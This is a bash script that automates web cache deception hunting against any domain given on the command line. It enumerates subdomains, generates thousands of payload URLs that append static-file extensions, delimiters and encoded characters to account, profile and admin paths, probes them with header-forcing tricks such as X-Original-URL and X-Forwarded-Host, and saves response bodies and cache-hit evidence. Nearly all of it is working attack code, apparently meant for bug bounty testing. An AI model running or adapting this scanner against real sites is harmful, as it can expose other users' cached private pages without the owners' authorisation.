#!/usr/bin/env bash
# cache.sh — Automated Web Cache Deception hunter
# Author: Fancy (Deepak Parkash)
# Source basis: "Mastering Web Cache Deception..." (coffinxp) + added methods
# Requires: subfinder, httpx, curl, awk, sed, grep, sort, tr
# Optional: gau (for extra URL seeds), jq, parallel/anew (if present)

set -euo pipefail

usage() {
  cat <<'USAGE'
Usage:
  ./cache.sh -d target.com [-o outdir] [-t threads] [-p http_proxy] [--no-gau]

What it does:
  1) subfinder -> httpx live hosts
  2) builds WCD payload URLs (sensitive paths + static-like extensions + delimiters/encodings + */ tricks + query-key injections)
  3) probes with multiple modes:
       - baseline (no-cache)
       - accept/MIME trick
       - header-forcing sets (X-Original-URL, X-Rewrite-URL, X-Forwarded-*)
  4) flags likely cacheable sensitive responses (HIT/AGE>0/etc)
  5) outputs CSV + raw header evidence

Examples:
  ./cache.sh -d example.com
  ./cache.sh -d example.com -o out_example -t 80
  ./cache.sh -d example.com -p http://127.0.0.1:8080 --no-gau
USAGE
}

# -------- Args --------
TARGET=""
OUTDIR=""
THREADS=60
HTTP_PROXY=""
USE_GAU=1

while (( "$#" )); do
  case "${1:-}" in
    -d) TARGET="${2:-}"; shift 2;;
    -o) OUTDIR="${2:-}"; shift 2;;
    -t) THREADS="${2:-}"; shift 2;;
    -p) HTTP_PROXY="${2:-}"; shift 2;;
    --no-gau) USE_GAU=0; shift;;
    -h|--help) usage; exit 0;;
    *) echo "Unknown arg: $1"; usage; exit 1;;
  esac
done

if [[ -z "${TARGET}" ]]; then usage; exit 1; fi
OUTDIR="${OUTDIR:-wcd_${TARGET}_$(date +%Y%m%d_%H%M%S)}"
mkdir -p "${OUTDIR}"/{evidence,lists,tmp}

echo "[*] Output directory: ${OUTDIR}"

# -------- Dependency checks --------
need() { command -v "$1" >/dev/null 2>&1 || { echo "[-] Missing dependency: $1"; exit 1; }; }
need subfinder
need httpx
need curl
need awk
need sed
need grep
need sort
need tr

HXX="httpx -silent -no-color -timeout 15 -t ${THREADS}"
[[ -n "${HTTP_PROXY}" ]] && HXX+=" -http-proxy ${HTTP_PROXY}"

CURL="curl -sk --max-time 20"
[[ -n "${HTTP_PROXY}" ]] && CURL+=" -x ${HTTP_PROXY}"

# -------- Recon: subdomains -> live base URLs --------
echo "[*] Enumerating subdomains with subfinder..."
subfinder -silent -d "${TARGET}" | sort -u > "${OUTDIR}/lists/subs.txt"
echo "[*] Probing live hosts with httpx..."
cat "${OUTDIR}/lists/subs.txt" | ${HXX} -scheme -status-code -title -cl 2>/dev/null \
  | tee "${OUTDIR}/tmp/live_raw.txt" >/dev/null

# Extract clean base URLs (with scheme)
awk '{print $1}' "${OUTDIR}/tmp/live_raw.txt" | sort -u > "${OUTDIR}/lists/live.txt"
echo "[*] Live hosts: $(wc -l < "${OUTDIR}/lists/live.txt")"

# -------- Seeds: sensitive paths from article --------
# (Full list from the article)
read -r -d '' SENSITIVE_PATHS <<'EOF' || true
/account
/profile
/dashboard
/settings
/user
/admin
/private
/my-account
/user/profile
/dashboard/image
/dashboard/profile
/account/user
/address
/account/settings
/profile/edit
/user/settings
/admin/panel
/private/files
/my-account/orders
/user/details
/dashboard/reports
/account/profile
/account/info
/profile/view
/admin/settings
/private/data
/my-account/settings
/user/account
EOF

# -------- Extensions (from article, deduped & trimmed to useful) --------
read -r -d '' EXTENSIONS <<'EOF' || true
.css
.js
.svg
.jpg
.jpeg
.png
.gif
.ico
.html
.json
.txt
.pdf
.woff
.woff2
.ttf
.otf
.eot
.xml
.csv
.mp4
.webm
.zip
.gz
.bz2
.7z
EOF

# -------- Delimiters / specials / encoded (from article) --------
read -r -d '' DELIMS <<'EOF' || true
;
~
?
#
//
/
..
.
_
-
@
=
##
!*
!
&
$
%5c
%3d
%2f
%2e
%26
%23
%20
%0a
%09
%00
EOF

# Special delimiter-infix before extensions (article’s ";.ext?test=123" family)
read -r -d '' SEMI_EXTS <<'EOF' || true
;.js?test=123
;.css?test=123
;.jpeg?test=123
;.jpg?test=123
;.png?test=123
;.gif?test=123
;.woff?test=123
;.woff2?test=123
;.ttf?test=123
;.otf?test=123
;.svg?test=123
;.html?test=123
;.xml?test=123
;.json?test=123
EOF

# Encoded backtick (%60) pre-ext (article)
read -r -d '' ENC60_EXTS <<'EOF' || true
%60.js?test=123
%60.css?test=123
%60.jpeg?test=123
%60.jpg?test=123
%60.png?test=123
%60.gif?test=123
%60.woff?test=123
%60.woff2?test=123
%60.ttf?test=123
%60.otf?test=123
%60.svg?test=123
%60.html?test=123
%60.xml?test=123
%60.json?test=123
EOF

# Suffix "/*" trick per article
read -r -d '' STAR_SUFFIX_EXTS <<'EOF' || true
.js/*
.css/*
.jpeg/*
.jpg/*
.png/*
.gif/*
.woff/*
.woff2/*
.ttf/*
.otf/*
.svg/*
.html/*
.xml/*
.json/*
EOF

# Query-key injection patterns (article + a few pragmatic ones)
read -r -d '' QUERY_PATTERNS <<'EOF' || true
?file=main.js
?theme=dark.css
?resource=profile.jpg
?view=dashboard.png
?callback=static.js
?test=123
?v=1.css
?asset=app.js
?t=169
EOF

# Optional: pull historical URLs with gau and mine likely-private bases
if [[ "${USE_GAU}" -eq 1 ]] && command -v gau >/dev/null 2>&1; then
  echo "[*] Seeding with gau..."
  gau -providers wayback,otx,commoncrawl,alienvault,github,archivedotorg "${TARGET}" 2>/dev/null \
    | grep -E '/(account|profile|dashboard|settings|user|admin|private|my-account)(/|$|[?])' \
    | sort -u > "${OUTDIR}/lists/gau_seeds.txt" || true
else
  : > "${OUTDIR}/lists/gau_seeds.txt"
fi

# -------- Generate payload URLs --------
echo "[*] Generating payload URLs..."
PAYLIST="${OUTDIR}/lists/payloads.txt"
: > "${PAYLIST}"

# Helpers: turn multiline blocks into bash arrays
mapfile -t PATHS_A < <(echo "${SENSITIVE_PATHS}")
mapfile -t EXTS_A  < <(echo "${EXTENSIONS}")
mapfile -t DELIMS_A < <(echo "${DELIMS}")
mapfile -t SEMI_A < <(echo "${SEMI_EXTS}")
mapfile -t ENC60_A < <(echo "${ENC60_EXTS}")
mapfile -t STAR_A < <(echo "${STAR_SUFFIX_EXTS}")
mapfile -t QUERY_A < <(echo "${QUERY_PATTERNS}")

while read -r base; do
  [[ -z "${base}" ]] && continue
  for ep in "${PATHS_A[@]}"; do
    # 1) Plain extension appends
    for ex in "${EXTS_A[@]}"; do
      echo "${base}${ep}${ex}" >> "${PAYLIST}"
      # 2) delimiter + ext combos
      for d in "${DELIMS_A[@]}"; do
        echo "${base}${ep}${d}${ex}" >> "${PAYLIST}"
        echo "${base}${ep}${ex}/${d}" >> "${PAYLIST}"
      done
    done
    # 3) special ;.ext?test combos
    for s in "${SEMI_A[@]}"; do
      echo "${base}${ep}${s}" >> "${PAYLIST}"
    done
    # 4) encoded backtick %60 pre-ext
    for e in "${ENC60_A[@]}"; do
      echo "${base}${ep}${e}" >> "${PAYLIST}"
    done
    # 5) star suffix ext/*
    for st in "${STAR_A[@]}"; do
      echo "${base}${ep}${st}" >> "${PAYLIST}"
    done
    # 6) query-key injections
    for q in "${QUERY_A[@]}"; do
      echo "${base}${ep}${q}" >> "${PAYLIST}"
    done
    # 7) fake directories from article examples
    echo "${base}${ep}.css/login" >> "${PAYLIST}"
    echo "${base}${ep}.js/test"   >> "${PAYLIST}"
    echo "${base}${ep}/test/style.css" >> "${PAYLIST}"
  done
done < "${OUTDIR}/lists/live.txt"

# Add any gau-derived seeds directly (they may already be 'deep' paths)
if [[ -s "${OUTDIR}/lists/gau_seeds.txt" ]]; then
  cat "${OUTDIR}/lists/gau_seeds.txt" >> "${PAYLIST}"
fi

# Dedupe + basic sanity prune
sed 's|//\+|/|g; s|https:/|https://|; s|http:/|http://|' "${PAYLIST}" \
  | sort -u > "${OUTDIR}/lists/payloads.dedup.txt"

TOTAL=$(wc -l < "${OUTDIR}/lists/payloads.dedup.txt")
echo "[*] Payload candidates: ${TOTAL}"

# -------- Candidate filter: only 200s with httpx first (fast prefilter) --------
echo "[*] Prefilter with httpx (200 only)... this trims noise."
${HXX} -mc 200 -paths "${OUTDIR}/lists/payloads.dedup.txt" \
  -H "Cache-Control: no-cache" \
  -title -status-code -cl \
  | tee "${OUTDIR}/tmp/candidates_raw.txt" >/dev/null

awk '{print $1}' "${OUTDIR}/tmp/candidates_raw.txt" | sort -u > "${OUTDIR}/lists/candidates.txt"
echo "[*] Candidates after 200 filter: $(wc -l < "${OUTDIR}/lists/candidates.txt")"

# -------- Probing modes --------
CSV="${OUTDIR}/results.csv"
echo "url,mode,status,content_length,cache_signal,age,server,via,title,evidence_file" > "${CSV}"

detect_cache_hit() {
  # stdin: headers; prints "HIT:<signal>;AGE:<age>;SRV:<server>;VIA:<via>"
  local hdr
  hdr="$(cat)"
  local sig=""; local age=""; local srv=""; local via=""
  # Common vendor signals
  if   echo "$hdr" | grep -qiE 'CF-Cache-Status:\s*HIT'; then sig="CF-Cache-Status:HIT"
  elif echo "$hdr" | grep -qiE 'Akamai-Cache-Status:\s*HIT|X-Akamai-Cache-Key'; then sig="Akamai:HIT"
  elif echo "$hdr" | grep -qiE 'X-Cache(\-Status)?:\s*HIT'; then sig="X-Cache:HIT"
  elif echo "$hdr" | grep -qiE 'X-Proxy-Cache:\s*HIT'; then sig="X-Proxy-Cache:HIT"
  elif echo "$hdr" | grep -qiE 'Fastly-(Cache|Debug)'; then sig="Fastly:signal"
  fi
  local agev
  agev="$(echo "$hdr" | awk -F': ' 'tolower($1)=="age"{print $2}' | tr -d '\r' | head -n1 || true)"
  [[ -n "${agev}" && "${agev}" != "0" ]] && age="${agev}"
  local srvv; srvv="$(echo "$hdr" | awk -F': ' 'tolower($1)=="server"{print $2}' | tr -d '\r' | head -n1 || true)"
  local viav; viav="$(echo "$hdr" | awk -F': ' 'tolower($1)=="via"{print $2}' | tr -d '\r' | head -n1 || true)"
  echo "SIG:${sig};AGE:${age};SRV:${srvv};VIA:${viav}"
}

probe() {
  local url="$1"; local mode="$2"; shift 2
  # shellcheck disable=SC2086
  local hdrs; hdrs="$(${CURL} -I "$@" "$url")" || hdrs=""
  [[ -z "${hdrs}" ]] && return 0
  local stat; stat="$(echo "${hdrs}" | awk 'NR==1{print $2}')"
  local cl; cl="$(echo "${hdrs}" | awk -F': ' 'tolower($1)=="content-length"{print $2}' | tr -d '\r' | head -n1)"
  local title=""; title="$(${CURL} -s "$@" "$url" | sed -n 's:.*<title>\(.*\)</title>.*:\1:p' | head -n1)"
  local det; det="$(echo "${hdrs}" | detect_cache_hit)"
  local sig; sig="$(sed -n 's/.*SIG:\([^;]*\).*/\1/p' <<< "${det}")"
  local age; age="$(sed -n 's/.*AGE:\([^;]*\).*/\1/p' <<< "${det}")"
  local srv; srv="$(sed -n 's/.*SRV:\([^;]*\).*/\1/p' <<< "${det}")"
  local via; via="$(sed -n 's/.*VIA:\(.*\)$/\1/p' <<< "${det}")"
  local evf="${OUTDIR}/evidence/$(echo -n "${url}_${mode}" | tr '/:?&#%=' '_')_headers.txt"
  printf "%s\n\n=== BODY SAMPLE (first 800 bytes) ===\n" "${hdrs}" > "${evf}"
  ${CURL} -s "$@" "$url" | head -c 800 >> "${evf}" || true
  echo "${url},${mode},${stat},${cl},${sig},${age},${srv},${via},\"${title}\",${evf}" >> "${CSV}"
}

echo "[*] Probing candidates with multiple modes..."

# Iterate URLs (sequential by default; you can wrap with GNU parallel if you want)
while read -r url; do
  [[ -z "${url}" ]] && continue

  # Mode A: Baseline, no-cache
  probe "${url}" "baseline" -H "Cache-Control: no-cache" -H "Pragma: no-cache"

  # Mode B: MIME trick (often .css)
  probe "${url}" "accept-css" -H "Accept: text/css,*/*;q=0.1" -H "Cache-Control: no-cache"

  # Mode C: CDN coax — Surrogate/Pragma variations
  probe "${url}" "surrogate" -H "Surrogate-Control: max-age=86400" -H "Cache-Control: public, max-age=86400"

  # Mode D: Header-forcing sets (try to remap dynamic to static path)
  # We’ll test a few plausible sensitive bases:
  for force in "/account" "/profile" "/settings" "/user/profile" "/admin"; do
    # 1) Original/Rewrite URL tricks
    probe "${url}" "X-Original-URL:${force}" \
      -H "X-Original-URL: ${force}" -H "Cache-Control: no-cache"
    probe "${url}" "X-Rewrite-URL:${force}" \
      -H "X-Rewrite-URL: ${force}" -H "Cache-Control: no-cache"

    # 2) Forwarded host/path tricks to point to a cacheable static
    probe "${url}" "XFwd-Host-Path:${force}" \
      -H "X-Forwarded-Host: static.${TARGET}" \
      -H "X-Forwarded-Proto: https" \
      -H "X-Forwarded-Path: ${force}/style.css" \
      -H "Cache-Control: no-cache"

    # 3) Alt host headers sometimes respected by proxies
    probe "${url}" "X-Host:${force}" \
      -H "X-Host: ${TARGET}" \
      -H "X-Forwarded-Path: ${force}/app.js" \
      -H "Cache-Control: no-cache"

    # 4) Nginx accel/rewrites (rare but fun)
    probe "${url}" "X-Accel-Redirect:${force}" \
      -H "X-Accel-Redirect: ${force}/style.css" -H "Cache-Control: no-cache"
  done

  # Mode E: Query-key cache injections (duplicate here in probe to capture headers cleanly too)
  for q in "${QUERY_A[@]}"; do
    probe "${url}${q}" "query-key" -H "Cache-Control: no-cache"
  done

done < "${OUTDIR}/lists/candidates.txt"

# -------- Findings summary --------
echo "[*] Scan complete."
echo "[*] Results CSV: ${CSV}"
echo "[*] Evidence headers/bodies: ${OUTDIR}/evidence/"
echo "[*] Quick hits (cache signals or Age>0):"
awk -F',' 'NR>1 && ($5!="" || $6!="" && $6!="0"){print $0}' "${CSV}" | tee "${OUTDIR}/likely_hits.txt" >/dev/null
echo "[*] Likely hits saved to: ${OUTDIR}/likely_hits.txt"

# Optional: pretty-print top signals
echo "[*] Top cache signals:"
awk -F',' 'NR>1{print $5}' "${CSV}" | sort | uniq -c | sort -nr | head -n 20
